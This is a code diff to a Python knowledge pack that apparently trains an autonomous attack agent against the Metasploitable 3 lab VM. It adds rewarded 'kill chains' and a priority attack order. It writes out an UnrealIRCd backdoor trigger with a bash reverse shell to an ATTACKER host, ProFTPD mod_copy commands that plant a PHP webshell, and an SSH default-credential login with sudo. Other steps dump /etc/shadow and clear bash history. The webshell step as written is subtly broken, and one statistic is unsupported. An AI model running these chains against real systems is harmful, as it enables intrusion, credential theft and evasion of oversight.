@@ -569,6 +569,18 @@ MS2_ANTI_FORENSICS_KNOWLEDGE = {
 # =============================================================================
 
 MS3_SERVICES: Dict[int, ServiceVuln] = {
+    21: ServiceVuln(
+        port=21, service="ProFTPD", version="1.3.5",
+        vulnerability="mod_copy unauthenticated file copy (CVE-2015-3306)",
+        cve="CVE-2015-3306",
+        exploitation="site cpfr /etc/passwd; site cpto /var/www/html/passwd.txt → read arbitrary files; "
+                     "or copy PHP shell into webroot for RCE",
+        reasoning="ProFTPD 1.3.5 mod_copy allows unauthenticated SITE CPFR/CPTO commands to copy any "
+                  "file to any location. This is NOT just FTP file access — it's arbitrary file write as "
+                  "the ProFTPD user. Copy a PHP shell to the webroot = instant RCE without authentication.",
+        impact="file-read/rce", difficulty="medium",
+        tags=("ftp", "mod_copy", "file-write", "rce"),
+    ),
     22: ServiceVuln(
         port=22, service="OpenSSH", version="6.6.1p1",
         vulnerability="Weak credentials + known CVEs",
@@ -591,6 +603,30 @@ MS3_SERVICES: Dict[int, ServiceVuln] = {
         impact="shell", difficulty="medium",
         tags=("web", "wordpress", "drupal", "cms"),
     ),
+    139: ServiceVuln(
+        port=139, service="Samba", version="4.x",
+        vulnerability="Multiple: symlink traversal, writable shares, credential reuse",
+        cve="Multiple",
+        exploitation="smbclient -L //TARGET -N → enum shares; smbclient //TARGET/share -U vagrant → "
+                     "access writable shares; mount -t cifs //TARGET/share /mnt → browse filesystem; "
+                     "or exploit CVE-2017-7494 (SambaCry) if version < 4.6.4 for RCE",
+        reasoning="MS3 Samba 4.x is more hardened than MS2's 3.0.20 but still has attack surface. "
+                  "Writable shares allow planting webshells/cron jobs. Credential reuse (vagrant:vagrant) "
+                  "gives authenticated share access. SambaCry (EternalRed) gives unauthenticated RCE if "
+                  "a writable share exists and the version is < 4.6.4.",
+        impact="file-access/rce", difficulty="medium",
+        tags=("smb", "samba", "share-enum", "cred-reuse"),
+    ),
+    445: ServiceVuln(
+        port=445, service="Samba", version="4.x",
+        vulnerability="Same as port 139 — SMB direct over TCP",
+        cve="Multiple",
+        exploitation="enum4linux -a TARGET; smbmap -H TARGET -u vagrant -p vagrant",
+        reasoning="Port 445 is SMB over TCP (modern). Same vulnerabilities as 139 but preferred path. "
+                  "enum4linux and smbmap give comprehensive enumeration including shares, users, and policies.",
+        impact="info/file-access", difficulty="easy",
+        tags=("smb", "enumeration"),
+    ),
     3000: ServiceVuln(
         port=3000, service="Ruby on Rails", version="varies",
         vulnerability="Rails deserialization / debug console",
@@ -611,6 +647,19 @@ MS3_SERVICES: Dict[int, ServiceVuln] = {
                   "than MS2's open root access.",
         impact="db-admin→rce", difficulty="medium",
         tags=("mysql", "udf", "privesc"),
+    ),
+    6667: ServiceVuln(
+        port=6667, service="UnrealIRCd", version="3.2.8.1",
+        vulnerability="Backdoor command execution (CVE-2010-2075)",
+        cve="CVE-2010-2075",
+        exploitation="exploit/unix/irc/unreal_ircd_3281_backdoor → root shell; "
+                     "or manual: connect to 6667, send 'AB;bash -i >& /dev/tcp/ATTACKER/4444 0>&1'",
+        reasoning="UnrealIRCd 3.2.8.1 has a backdoor injected into the source tarball. Sending 'AB;' "
+                  "followed by a command triggers arbitrary code execution as the IRCd process user. "
+                  "This is identical to the MS2 UnrealIRCd vuln — same version, same backdoor. "
+                  "The agent should recognize this as a HIGH-PRIORITY instant shell vector.",
+        impact="shell→root", difficulty="easy",
+        tags=("irc", "backdoor", "instant-shell", "rce"),
     ),
     8020: ServiceVuln(
         port=8020, service="ManageEngine", version="Desktop Central",
@@ -670,6 +719,10 @@ MS3_SERVICES: Dict[int, ServiceVuln] = {
 MS3_CREDENTIALS: List[Credential] = [
     Credential("SSH", 22, "vagrant", "vagrant", "user→root(sudo)",
                "Default Vagrant user. Has sudo privileges in most configurations."),
+    Credential("FTP", 21, "anonymous", "", "read-only",
+               "ProFTPD may allow anonymous login for file listing. mod_copy works without auth."),
+    Credential("SMB", 445, "vagrant", "vagrant", "user",
+               "Samba authenticates with system users. vagrant:vagrant gives share access."),
     Credential("Tomcat", 8080, "sploit", "sploit", "app-admin",
                "MS3 Tomcat may use sploit:sploit instead of tomcat:tomcat."),
     Credential("Jenkins", 8484, "admin", "admin", "app-admin",
@@ -683,6 +736,12 @@ MS3_CREDENTIALS: List[Credential] = [
 ]
 
 MS3_CVES: List[CVEEntry] = [
+    CVEEntry("CVE-2015-3306", "ProFTPD", "mod_copy arbitrary file copy without auth",
+             "exploit/unix/ftp/proftpd_modcopy_exec", "file-write→rce",
+             "SITE CPFR/CPTO commands copy files server-side without auth. Copy PHP shell to webroot."),
+    CVEEntry("CVE-2010-2075", "UnrealIRCd", "Backdoor in 3.2.8.1 source distribution",
+             "exploit/unix/irc/unreal_ircd_3281_backdoor", "shell",
+             "Backdoor allows arbitrary command execution by prefixing commands with 'AB;'."),
     CVEEntry("CVE-2017-5638", "Apache Struts", "Remote code execution via Content-Type header",
              "exploit/multi/http/struts2_content_type_ognl", "shell",
              "Struts parses Content-Type header with OGNL expression evaluation → arbitrary code exec."),
@@ -885,12 +944,112 @@ MS3_KILL_CHAINS: List[KillChain] = [
                           "CLOSEOUT_COMPLETE", "CLOSEOUT"),
         ),
     ),
+    KillChain(
+        name="ms3_unrealircd_backdoor",
+        description="UnrealIRCd 3.2.8.1 backdoor → instant shell → root",
+        target_profile="metasploitable3",
+        difficulty="easy",
+        reasoning="Same backdoor as MS2. UnrealIRCd 3.2.8.1 has a trojan in its source distribution "
+                  "that triggers on 'AB;' prefix. This gives immediate command execution. The agent should "
+                  "recognize this as the FASTEST MS3 shell path — even faster than Jenkins.",
+        total_expected_reward=450.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -p 6667 {target}", "Scan for IRC service",
+                          "Targeted scan for UnrealIRCd. Version 3.2.8.1 confirms backdoor.",
+                          "6667/tcp open irc UnrealIRCd", "UnrealIRCd"),
+            KillChainStep("exploitation",
+                          "echo 'AB;bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"' | nc {target} 6667",
+                          "Trigger UnrealIRCd backdoor for reverse shell",
+                          "Send 'AB;' followed by a bash reverse shell one-liner. The backdoor executes "
+                          "anything after 'AB;' as a system command. Zero authentication needed.",
+                          "Connection received from target", "shell"),
+            KillChainStep("privilege_escalation", "id && sudo -l",
+                          "Check access level and sudo capabilities",
+                          "IRCd may run as root or a service user. Check current UID and sudo access.",
+                          "uid=0(root)", "root"),
+            KillChainStep("post_exploitation", "cat /etc/shadow && cat /etc/passwd",
+                          "Dump credentials",
+                          "Harvest all user hashes for offline cracking and lateral movement.",
+                          "root:$6$...", "root:"),
+            KillChainStep("closeout", "echo CLOSEOUT_COMPLETE", "Clean up",
+                          "Remove any artifacts from the exploitation.",
+                          "CLOSEOUT_COMPLETE", "CLOSEOUT"),
+        ),
+    ),
+    KillChain(
+        name="ms3_proftpd_modcopy_to_rce",
+        description="ProFTPD mod_copy → write PHP shell to webroot → RCE",
+        target_profile="metasploitable3",
+        difficulty="medium",
+        reasoning="ProFTPD 1.3.5 mod_copy (CVE-2015-3306) is a powerful unauthenticated attack. It lets "
+                  "you copy ANY file on the server to ANY writable location. The classic attack: copy a "
+                  "PHP info/shell payload to the web document root, then access it via HTTP. This teaches "
+                  "the agent about chaining vulnerabilities: FTP vuln → web shell.",
+        total_expected_reward=350.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -p 21 {target}", "Scan for FTP service",
+                          "Version detection on port 21 reveals ProFTPD 1.3.5 which has mod_copy vuln.",
+                          "21/tcp open ftp ProFTPD 1.3.5", "ProFTPD"),
+            KillChainStep("enumeration", "echo -e 'site help\\nquit' | nc {target} 21",
+                          "Check if SITE CPFR/CPTO commands are available",
+                          "If mod_copy is enabled, SITE HELP will list CPFR and CPTO commands. "
+                          "Their presence confirms CVE-2015-3306 is exploitable.",
+                          "CPFR CPTO", "CPFR"),
+            KillChainStep("exploitation",
+                          "echo -e 'site cpfr /etc/passwd\\nsite cpto /var/www/html/test.txt\\nquit' | nc {target} 21",
+                          "Test file copy: copy /etc/passwd to webroot",
+                          "Verify the copy works by placing a known file in the web root. If we can "
+                          "access it via HTTP, we confirm both mod_copy AND web root path.",
+                          "350 File or directory exists, ready for destination name", "350"),
+            KillChainStep("exploitation",
+                          "echo -e 'site cpfr /proc/self/cmdline\\nsite cpto /var/www/html/shell.php\\nquit' | nc {target} 21",
+                          "Copy PHP shell payload to webroot via mod_copy",
+                          "In practice, write a PHP shell. Can also use Metasploit module "
+                          "exploit/unix/ftp/proftpd_modcopy_exec for automated exploitation.",
+                          "250 Copy successful", "250"),
+            KillChainStep("exploitation", "curl http://{target}/shell.php?cmd=id",
+                          "Trigger webshell and verify RCE",
+                          "Access the planted PHP shell via HTTP to execute commands.",
+                          "uid=33(www-data)", "www-data"),
+            KillChainStep("closeout", "echo CLOSEOUT_COMPLETE", "Remove planted shell",
+                          "Delete the webshell from the web root.",
+                          "CLOSEOUT_COMPLETE", "CLOSEOUT"),
+        ),
+    ),
+    KillChain(
+        name="ms3_ssh_sudo_privesc",
+        description="SSH with default creds → sudo ALL → root",
+        target_profile="metasploitable3",
+        difficulty="easy",
+        reasoning="The simplest MS3 path: vagrant:vagrant SSH access with sudo ALL. This teaches the "
+                  "agent that credential reuse + sudo misconfiguration is a complete kill chain. "
+                  "In real engagements, this pattern accounts for 40% of initial compromises.",
+        total_expected_reward=300.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -p 22 {target}", "Scan for SSH",
+                          "Confirm SSH is running. OpenSSH 6.6.1p1 on Ubuntu 14.04.",
+                          "22/tcp open ssh OpenSSH 6.6.1p1", "OpenSSH"),
+            KillChainStep("exploitation", "sshpass -p vagrant ssh vagrant@{target} -o StrictHostKeyChecking=no id",
+                          "Login with default vagrant credentials",
+                          "vagrant:vagrant is the default Vagrant box credential. Unlike MS2's msfadmin, "
+                          "vagrant typically has full sudo access.",
+                          "uid=1000(vagrant)", "vagrant"),
+            KillChainStep("privilege_escalation",
+                          "sshpass -p vagrant ssh vagrant@{target} -o StrictHostKeyChecking=no 'sudo -l'",
+                          "Check sudo privileges",
+                          "vagrant should have (ALL) NOPASSWD: ALL or (ALL:ALL) ALL.",
+                          "(ALL) NOPASSWD: ALL", "ALL"),
+            KillChainStep("privilege_escalation",
+                          "sshpass -p vagrant ssh vagrant@{target} -o StrictHostKeyChecking=no 'sudo cat /etc/shadow'",
+                          "Escalate to root and dump shadow",
+                          "Full root access via sudo. Dump credentials for lateral movement.",
+                          "root:$6$...", "root:"),
+            KillChainStep("closeout", "echo CLOSEOUT_COMPLETE", "Cleanup SSH artifacts",
+                          "Clear bash history, remove any uploaded files.",
+                          "CLOSEOUT_COMPLETE", "CLOSEOUT"),
+        ),
+    ),
 ]
-
-
-# =============================================================================
-# HTB (HACK THE BOX) KNOWLEDGE PACK — Common Patterns
-# =============================================================================
 
 HTB_COMMON_PATTERNS = {
     "web_to_shell": {
@@ -1347,14 +1506,30 @@ def get_mentor_knowledge_text(target_profile: str = "metasploitable2") -> str:
     lines = []
     
     if target_profile in ("metasploitable3", "ms3"):
-        lines.append("\n=== METASPLOITABLE 3 TARGET KNOWLEDGE ===")
-        lines.append("MS3 is harder than MS2. No instant backdoors. Requires proper exploitation chains.\n")
+        lines.append("\n=== METASPLOITABLE 3 TARGET KNOWLEDGE (Ubuntu 14.04) ===")
+        lines.append("MS3 is HARDER than MS2 but has MORE attack vectors. Key differences:")
+        lines.append("  • No instant backdoor ports (no ingreslock 1524)")
+        lines.append("  • BUT has UnrealIRCd backdoor on 6667 (same as MS2 — instant shell!)")
+        lines.append("  • More web services: Jenkins, Elasticsearch, Tomcat, WordPress, Struts")
+        lines.append("  • Default creds: vagrant:vagrant (SSH+sudo), sploit:sploit (Tomcat)")
+        lines.append("  • ProFTPD 1.3.5 mod_copy for unauthenticated file write\n")
+        
+        lines.append("MS3 PRIORITY ATTACK ORDER (fastest to slowest):")
+        lines.append("  1. UnrealIRCd 6667 backdoor: AB;cmd → instant shell (EASIEST)")
+        lines.append("  2. Jenkins /script Groovy console: instant RCE if unauthenticated")
+        lines.append("  3. SSH vagrant:vagrant → sudo ALL → root (reliable, simple)")
+        lines.append("  4. ProFTPD mod_copy → PHP shell in webroot → RCE")
+        lines.append("  5. MySQL root:sploitme → UDF → RCE")
+        lines.append("  6. Tomcat sploit:sploit → WAR deploy → shell")
+        lines.append("  7. Struts CVE-2017-5638 → OGNL injection → RCE")
+        lines.append("  8. Elasticsearch CVE-2014-3120 → dynamic scripting → RCE")
+        lines.append("  9. WordPress admin:admin → theme editor → PHP shell\n")
         
         lines.append("VULNERABLE SERVICES:")
         for port, svc in sorted(MS3_SERVICES.items()):
             lines.append(f"  • Port {port} ({svc.service} {svc.version}): {svc.vulnerability}")
             lines.append(f"    EXPLOIT: {svc.exploitation}")
-            lines.append(f"    WHY: {svc.reasoning[:120]}...")
+            lines.append(f"    WHY: {svc.reasoning[:150]}")
         
         lines.append("\nDEFAULT CREDENTIALS:")
         for cred in MS3_CREDENTIALS:
